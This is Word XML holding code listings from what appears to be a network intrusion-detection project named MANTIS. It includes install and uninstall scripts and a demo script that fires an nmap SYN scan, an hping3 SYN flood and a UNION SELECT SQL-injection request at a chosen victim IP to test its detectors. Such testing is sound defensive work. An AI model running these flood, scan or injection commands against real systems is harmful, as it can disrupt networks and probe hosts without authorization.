    <w:p w14:paraId="64B981C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both `sudo mantis` and `sudo mantis-demo-attacks` resolve reliably.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB4840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 "$SUDO_BIN_DIR" != "$BIN_DIR" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173A37D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mkdir -p "$SUDO_BIN_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7C32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ln -sf "$INSTALL_DIR/main.py" "$SUDO_BIN_DIR/mantis"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A972B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ln -sf "$INSTALL_DIR/demo_all_attacks.sh" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246BBC5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"$SUDO_BIN_DIR/mantis-demo-attacks"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54261BD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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55070210" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08E6FC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capability so sensor runs without sudo (best effort - not always allowed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206EA8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PY_REAL=$(readlink -f "$(command -v python3)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504529F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command -v setcap &gt;/dev/null 2&gt;&amp;1 &amp;&amp; [ -x "$PY_REAL" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08672B5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setcap 'cap_net_raw,cap_net_admin=eip' "$PY_REAL" 2&gt;/dev/null; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F771B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echo "[+] capabilities set - you can run mantis without sudo"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D164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else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46FBDF5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echo "[!] setcap failed - just use 'sudo mantis'"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B40F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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B54E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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="039F4104" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F8DE9E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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525421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"[done] mantis installed"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0087EE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mantis              # run sensor without sudo (when capabilities are available)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DEBD3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sudo mantis         # run sensor with root privileges"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710F0C0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mantis --help"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="694C59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mantis-siem         # web dashboard"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3123CC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mantis-train --help # train from a dataset"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4569CCD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mantis-eval --help  # evaluate accuracy"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06E4AC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mantis-replay       # offline .pcap replay lab (no root, repeatable)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DB7944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mantis-demo-attacks # live: scan + flood + SQLi (needs root + MANTIS running)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C08152"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src/uninstall.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322E0799" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>38 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AE646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#!/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1D601D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04FD299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MANTIS Uninstallation Script</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F31D67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Removes the tool from the Linux system</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35FD145B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4902B6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1. Check for Root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081C9B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 "$EUID" -ne 0 ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C7FE6C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echo "[!] Error: Please run as root (sudo ./uninstall.sh)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C4D3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exit 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FA8CD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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F8DB08" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39F7A91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Starting MANTIS Uninstallation..."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D1E6909" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42B079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INSTALL_DIR="/opt/mantis"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072D428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BIN_DIRS="/usr/local/bin /usr/bin"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E5CEE2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COMMANDS="mantis mantis-siem mantis-train mantis-eval mantis-replay mantis-demo-attacks"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E2A5810" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="398159A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2. Remove Symlinks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3259D8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for BIN_DIR in $BIN_DIRS; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BDB343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echo "[*] Removing MANTIS symlinks from $BIN_DIR..."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="636F6FC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for COMMAND in $COMMANDS; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452130C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LINK_PATH="$BIN_DIR/$COMMAND"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25589D8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 -L "$LINK_PATH" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539F30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rm "$LINK_PATH"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D17B25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echo "    - Removed $LINK_PATH"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3121E1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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD82ED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done</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8A489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done</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670FE288" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67726A2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3. Remove Directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5F1F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 -d "$INSTALL_DIR" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4765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echo "[*] Removing installation directory $INSTALL_DIR..."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D1A866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rm -rf "$INSTALL_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA2F82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echo "    - Removed $INSTALL_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7016EF2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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE24054" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14CAAC2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echo ""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3B6BF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"[SUCCESS] MANTIS Uninstalled Successfully!"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08AA0973"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src/demo_all_attacks.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E393A05" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>156 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7473C9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#!/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FF6A9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Run all 3 live attacks in one command - tests KNN, Z-Score, and Naive Bayes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A8086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5E582FF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Usage (MANTIS must already be running in another terminal):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7833EB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cd src</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ACDE60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sudo ./demo_all_attacks.sh                    # auto: wlan0 LAN IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47FFA31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sudo ./demo_all_attacks.sh lo                 # loopback 127.0.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35209AD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sudo ./demo_all_attacks.sh 192.168.196.228    # explicit victim IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE23DF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sudo ./demo_all_attacks.sh 192.168.196.228 8  # IP + flood seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08702E9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52B7DBA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Attacks run in order:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7272611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1. Port scan   -&gt; KNN engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2904B8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2. Max flood   -&gt; Z-Score engine  (5 sec)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="352FA91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3. SQLi curl   -&gt; Naive Bayes engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="007691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5FC9F2C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Needs: sudo, nmap, hping3, curl, nc</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61731AB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set -e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D5287D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="677F11D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SQLI_PORT=8085</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DD0595" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A2BE4B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detect_lan_ip() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F32F0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local ip</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C600FD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wlan0 first (typical laptop Wi-Fi - e.g. 192.168.196.228)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C4D4F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ip=$(ip -4 addr show wlan0 2&gt;/dev/null | awk '/inet / {print $2}' | cut -d/ -f1 | head -1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CEECC0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 -n "$ip" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6015A75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echo "$ip"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39C1B8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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57CC34A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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="500D312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any UP interface except lo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2523856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ip=$(ip -4 -o addr show scope global 2&gt;/dev/null | awk '{print $4}' | cut -d/ -f1 | head -1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC0966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 -n "$ip" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D56E82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echo "$ip"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A14E7E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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F104FB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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCE38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 default route source</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1569DCA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ip=$(ip -4 route get 1.1.1.1 2&gt;/dev/null | awk '/src/ {for (i = 1; i &lt;= NF; i++) if ($i == "src") { print $(i + 1); exit }}')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="194280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 -n "$ip" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27580B6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echo "$ip"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B9BD4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return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9EAD8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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0174B79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echo "127.0.0.1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B3EC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1289AEFD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="470ADE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show_network() {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0705BB8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echo "  Your interfaces:"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F6D46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ip -4 -o addr show 2&gt;/dev/null | while read -r _ if _ addr _; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7540128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addr="${addr%%/*}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36143A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state=$(ip link show "$if" 2&gt;/dev/null | awk '/state/ {print $2}')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410720D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echo "    $if  $addr  ($state)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4982AC1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done</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351006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42D94604" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="245FD0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 "$EUID" -ne 0 ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD4A8A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echo "[!] run as root: sudo ./demo_all_attacks.sh [IP|lo] [flood_seconds]"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B55FC0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exit 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CB2AD0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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA5A602" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56DE963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victim IP: lo/local -&gt; 127.0.0.1, empty -&gt; auto-detect wlan/LAN, else use argument</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3435564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if [ -z "${1:-}" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3BD8A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VICTIM=$(detect_lan_ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF2757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IP_MODE="auto (wlan/LAN)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F918C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elif [ "$1" = "lo" ] || [ "$1" = "local" ] || [ "$1" = "127.0.0.1" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD4942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VICTIM="127.0.0.1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F45898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IP_MODE="loopback"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39B980D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else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C919E6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VICTIM="$1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1977133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IP_MODE="manual"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0828DC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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2291ABD7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="497A266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FLOOD_SEC="${2:-5}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E1F37D2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EAD52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for cmd in nmap hping3 curl nc; do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A3B13B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if ! command -v "$cmd" &gt;/dev/null 2&gt;&amp;1; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6771033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echo "[!] missing: $cmd"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7596233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case "$cmd" in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD29A1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hping3) echo "    install: sudo apt install hping3" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="796EA11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nmap)   echo "    install: sudo apt install nmap" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24272B2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esac</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DAE4B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exit 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A4CDF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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="377E866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done</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BF5DE48" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="725D159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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781347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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B2C79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lastRenderedPageBreak/>
        <w:t>echo "  MANTIS - All 3 Model Live Attack Demo"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="639FC7C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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C08BB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show_network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CBCC49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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40CDEDC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Victim IP      : $VICTIM  ($IP_MODE)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3726E15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Flood duration : ${FLOOD_SEC}s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A004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Active Wi-Fi   : wlan0 -&gt; use this IP when attacking from another device"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACCFA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Loopback       : sudo ./demo_all_attacks.sh lo"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64C43CD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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575F6BB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Watch the MANTIS dashboard: http://127.0.0.1:8080"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B3E9E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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B21130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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE360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Start MANTIS first and wait ~10 s for Z-Score baseline."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040BAC6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Only attack your own machine / lab VM."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE2195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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52F2758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read -r -p "Press Enter when MANTIS is running..." _</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A944105" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="648F296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 Attack 1: PORT SCAN -&gt; KNN ----------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6333D39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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5649482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"[1/3] PORT SCAN -&gt; KNN engine"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546118F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Command: nmap -sS -p 1-200 $VICTIM"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C089D8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nmap -sS  = SYN stealth scan (many ports quickly)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6190AC1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-p 1-200  = scan ports 1 to 200"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="062703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KNN sees: high unique_ports + packet_count -&gt; Scan alert"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21B6F1CD"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="026701D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nmap -sS -p 1-200 "$VICTIM"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BF648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Port scan done - check MANTIS for PORT SCAN DETECTED"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D81A3A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sleep 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71704F7A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CA5E77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 Attack 2: MAX PACKET FLOOD -&gt; Z-Score -----------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03ACB81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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="141EFC5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"[2/3] MAX PACKET FLOOD -&gt; Z-Score engine (${FLOOD_SEC}s)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C328A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Command: hping3 -S --flood -p 80 $VICTIM"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70FAD44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-S        = TCP SYN packets"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61AF54B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--flood   = send at MAXIMUM rate (no delay between packets)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E51693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-p 80     = target port 80"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343E251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Z-Score: z = (PPS - mean) / std -&gt; alert when z &gt; 3"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F20DE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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B16386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timeout "$FLOOD_SEC" hping3 -S --flood -p 80 "$VICTIM" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E7F2B6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Flood stopped - check MANTIS for DDoS DETECTED (red dashboard)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB1C42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sleep 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BFA213" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FB9A7C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 Attack 3: SQL INJECTION -&gt; Naive Bayes ----------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7066D80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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3479A69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"[3/3] SQL INJECTION -&gt; Naive Bayes engine"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F884A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Payload contains: UNION SELECT (SQLi keywords)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E061BC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Naive Bayes scores TCP payload text -&gt; Malicious alert"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B63F5E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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64DDBEF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nc -l -p "$SQLI_PORT" &gt;/dev/null 2&gt;&amp;1 &amp;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F3E2F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NC_PID=$!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C572AC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sleep 0.3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="070FB56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curl -s --max-time 3 \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00AE3BD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"http://${VICTIM}:${SQLI_PORT}/?id=1%20UNION%20SELECT%20user,password%20FROM%20users" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373A1BF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&gt;/dev/null 2&gt;&amp;1 || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B4EC3E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kill "$NC_PID" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BEEBB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wait "$NC_PID" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62664B3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SQLi request sent - check MANTIS for MALICIOUS PAYLOAD"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09602E2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sleep 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49D6AE2F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BE5272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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="311ADF9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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F00DCC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All 3 attacks complete - victim was $VICTIM"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F22A33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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EDC8EF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Engine tested   | Attack type      | What to look for on MANTIS"</w:t>
